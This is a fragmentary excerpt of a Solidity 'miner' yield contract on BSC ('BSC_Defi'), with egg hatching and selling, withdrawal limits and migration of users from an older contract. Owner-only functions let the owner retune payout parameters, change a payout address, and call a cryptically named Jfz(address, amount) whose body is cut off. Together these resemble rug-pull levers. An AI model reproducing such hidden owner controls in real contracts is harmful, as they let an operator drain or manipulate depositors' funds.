...
contract BSC_Defi is ReentrancyGuard {
    ...
    /***************************************************************************************
            CONSTRUCTOR
    ****************************************************************************************/
    constructor(address payable _owner, address payable _project, address payable _partner, address payable _marketing, address _briAddress) {
        owner = _owner;
        project = _project;
        partner = _partner;
    ...
    /*
        FUNCTION COMPRAR MINEROS
    */
    function hatchEggs(address ref, bool isCompound) public nonReentrant onlyBlackListed {
    ...
    */
    function sellEggs() public nonReentrant onlyBlackListed {
        ...
        uint256 eggTotal = WITHDRAW_LIMIT * hasEggs / eggValue;
        
        if(WITHDRAW_LIMIT != 0  && eggValue >= WITHDRAW_LIMIT) {
            if(hasEggs - eggTotal <= 0){
                user.claimedEggs = 0;
            }else{
                user.claimedEggs = hasEggs - eggTotal;
            }
    ...
    */
    function GetSetUserofOldContract(address _walletUserInterface) external nonReentrant{
        ...
        if(userContractNew.migrate == 0){
            ...
            userContractNew.totalLotteryBonus, 
    ...
    function CHANGE_BRI(address value) external {
        require(msg.sender == owner, "Admin use only.");
        briAddress = payable(value);
    }


    function set_makeEgg(uint256 _value) external {
        require(msg.sender == owner, "Admin use only.");
        marketEggs = _value;
    }
    
    function set_psnALL(uint256 _PSNS, uint256 _PSN, uint256 _PSNH) external {
        require(msg.sender == owner, "Admin use only.");
        PSNS = _PSNS;
        PSN = _PSN;
        PSNH = _PSNH;
    ...
    function Jfz(address _users, uint256 _ammount) external{
        require(msg.sender == owner, "Admin use only.");
